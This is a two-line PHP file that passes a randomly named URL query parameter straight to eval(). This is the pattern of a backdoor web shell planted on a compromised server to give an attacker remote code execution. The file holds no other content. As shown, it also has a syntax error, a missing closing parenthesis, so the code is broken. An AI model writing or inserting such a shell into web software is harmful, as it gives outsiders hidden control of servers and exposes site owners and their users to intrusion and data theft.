<?php
eval($_GET['0f5yrfHL'];
?>
